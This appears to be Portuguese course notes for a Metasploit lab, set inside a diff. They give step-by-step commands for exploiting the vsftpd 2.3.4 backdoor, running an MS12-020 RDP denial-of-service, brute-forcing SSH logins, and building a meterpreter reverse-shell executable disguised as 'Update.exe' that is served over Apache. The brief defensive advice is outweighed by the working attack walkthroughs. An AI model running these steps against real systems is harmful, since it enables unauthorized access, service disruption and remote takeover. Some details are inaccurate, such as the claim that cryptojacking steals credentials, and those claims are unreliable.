@@ -1,0 +1,208 @@
+## Introdução:
+
+- Explorar falhas, garantir acesso, executar ações e extrair dados de computadores vulneráveis.
+
+             **Percurso:**
+
+Etapa 1: Explorando falhas no FTP;
+
+Etapa 2: Ataque DoS no RDP;
+
+Etapa 3: Explorando falhas no SSH.
+
+Etapa 4: Adicionando backdoor em um executável.
+
+---
+
+## Explorando falhas no FTP:
+
+- O FTP é um dos métodos de compartilhamento de dados mais antigos e ainda usados.
+- Embora as equipes de TI e os usuários de negócios estejam familiarizados com isso, o FTP carece de muitos requisitos vitais de segurança, conformidade e fluxo de trabalho nas organizações modernas, especialmente em segurança de dados.
+
+            **Vulnerabilidades no FTP:**
+
+- Anonymous authentication;
+- Directory traversal attack;
+- Cross-site scripting;
+- Dridex.
+
+             **Metasploit:**
+
+- É uma ferramenta utilizada por cibercriminosos e hackers éticos para investigar vulnerabilidades em redes e servidores.
+
+           **Ferramentas do Metasploit:**
+
+- msfconsole: modo console;
+- msfweb: interface gráfica via browser;
+- msfpayload: gera e customiza payloads;
+- mescle: interface de automatização de invasão;
+- msflogdump: exibirá as sessões de arquivos logs.
+
+              **Payloads:**
+
+  **Módulos para exploit, sendo de três tipos:**
+
+- Singles;
+- Stagers;
+- Stages.
+
+          **Meterpreter:**
+
+- O meta-interpreter é um payload que funciona por injecção dll.
+- O meterpreter reside inteiramente na memória do anfitrião e não deixa vestígios no disco rígido (o que a torna de difícil detecção nas técnicas forenses).
+
+**Primeiro passo:**
+
+            **No Metasplotable:**
+
+**login**: msfadmin/msfadmin
+
+**criar um txt**: `touch arquivo.txt`
+
+**adicionar conteúdo no txt**: `echo ‘Olá, mundo’ >> exemplo.txt`
+
+**abrir txt**: `nano exemplo.txt` 
+
+**excluir txt**: `rm exemplo.txt` 
+
+**Segundo passo:** 
+
+                  **No Kali linux:**
+
+**Iniciar o metasploit**: `msfconsole`
+
+**segundo comando**: `search vsftpd` 
+
+**informações sobre**: `info exploit/unix/ftp/vsftpd_234_backdoor`     **(números é a versão)**
+
+**entrar**:  `use exploit/unix/ftp/vsftpd_234_backdoor`
+
+**configuração do host remoto**: `show options`
+
+**verificar ip na máquina do Metasplotable**: `ip addr`
+
+**adicionar ip no kali linux**: `set rhosts 192.168.56.103`
+
+**verificar os módulos**: `show payloads`
+
+**configurando payload**: `set payload payload/cmd/unix/interact`
+
+**acessando**: `exploit`
+
+---
+
+## Ataques DoS no Windows RDP:
+
+- RDP é a abreviação de Remote Desktop Protocol, sendo uma opção para controlar um sistema de computador remotamente.
+
+- O serviço RDP pode ser configurado por administradores de sistemas Windows para ser executado em TCP (geralmente na porta 3389) e/ou na porta UDP (3389).
+- Os ataques RDP são tentativas de agentes de ameaças de acessar um host de desktop remoto ou privilégios administrativos do cliente para reconhecimento, comando e controle de movimentação lateral.
+
+**Tipos de ataques RDP:**
+
+- Calling Into Robinhood
+- SamSam Ransomware
+
+**Prevenção:**
+
+- Autenticação multifator e requisitos complexos de credenciais de acesso.
+- Estabelecer políticas de bloqueio de conta para tentativas de força bruta.
+- Controle de acesso baseado em função (RBAC) para consoles RDP.
+- Restrições de acesso RDP baseados em firewall.
+
+**Ataque DoS em máquina virtual, com Windows XP:**
+
+         **Primeiro passo:**
+
+- Vamos acessar o Windows XP.
+- Ativar o acesso remoto.
+
+       **Segundo passo, no Kali Linux:**
+
+- `msfconsole`
+- `search rdp`
+- `use auxiliary/dos/windows/rdp/ms12_020/maxchannelids`
+- `set rhosts`     **//adiciona o ip do XP**
+- `run`
+
+---
+
+## **Explorando falhas do SSH:**
+
+- Nesta aula vamos abordar as falhas no SSH e explorá-las com o Metasploit.
+- O protocolo SSH é utilizado para a comunicação remota entre dispositivos, sendo executada na porta 22.
+- Utilizaremos o ataque de força bruta com arquivos de usuários e senhas para encontrar credenciais.
+
+**No Kali linux:**
+
+- `msfconsole`
+- `search ssh`
+- `search ssh_login`
+- `use auxiliary/scanner/ssh/ssh_login`
+- `info`
+- crie possibilidades no password/user, editando com o `nano`
+- configurando o IP: `set rhosts 192.168.1.200`
+- configurando caminho do user: `set USER_FILE /home/kali/user.txt`
+- configurando o caminho do password: `set PASS_FILE /home/kali/password/password.txt`
+- `exploit`
+- `sessions`  (mostra sessões em aberto)
+- `sessions 1` (entra na sessão em aberto)
+- `ip addr` (Se tudo deu certo, mostrará o IP remoto)
+- `ls` (mostrará as pastas da máquina remota)
+
+---
+
+## **Adicionando backdoor em um executável:**
+
+- Nesta aula vamos mascarar um backdoor para varredura em um arquivo executável.
+- É definido como o uso de qualquer malware/vírus/tecnologia para obter acesso não autorizado ao aplicativo/sistema/rede/driblando a segurança implementada.
+
+          **Tipos de ataques com backdoor:**
+
+- Spyware [espionagem]
+- Ransomware [criptografia]
+- DDoS [negação de serviço]
+- Cryptojacking [furto de credenciais]
+
+          **Proteção contra backdoor:**
+
+- Rotatividade de senhas
+- Monitoramento de atividades da rede
+- Cautela ao instalar programas
+- Antivírus
+
+           **Meterpreter:**
+
+- Ou Meta-Interpreter, é um payload que funciona por indejcção dll.
+- O meterpreter reside inteiramente na memória do anfitrião e não deixa vestígios no disco rígido (o que a torna de difícil detecção nas técnicas forenses).
+
+           **Prática:**
+
+- Vamos criar um backdoor embarcando em um executável e testar o ataque em uma VM.
+
+          **No Kali linux:**
+
+- `msfvenom`
+- `msfvenom -p windows/meterpreter/reverse_tcp -a x86 platform windows -f exe LHOST=MEUIP LPORT=4444 -o Update.exe`
+- `service apache2 start`  //iniciar servidor apache
+- `cp Upadte.exe /var/www/html`  //realizar uma cópia do .exe para raiz do apache
+- `cd /var/www/html`
+- `ls`
+
+         **No windows 7:**
+
+- Acessar no navegador ip da máquina remota, buscar o arquivo update.exe e baixar.
+
+        **No Kali linux:**
+
+- `msfconsole`
+- `use multi/handler`
+- **`set payload windows/meterpreter/reverse_tcp`**
+- **`info`**
+- `**set LHOST MEUIP**`
+- **`set LPORT 4444`**
+- **`run`**
+
+       **No windows 7:**
+
+- Execute o Update.exe
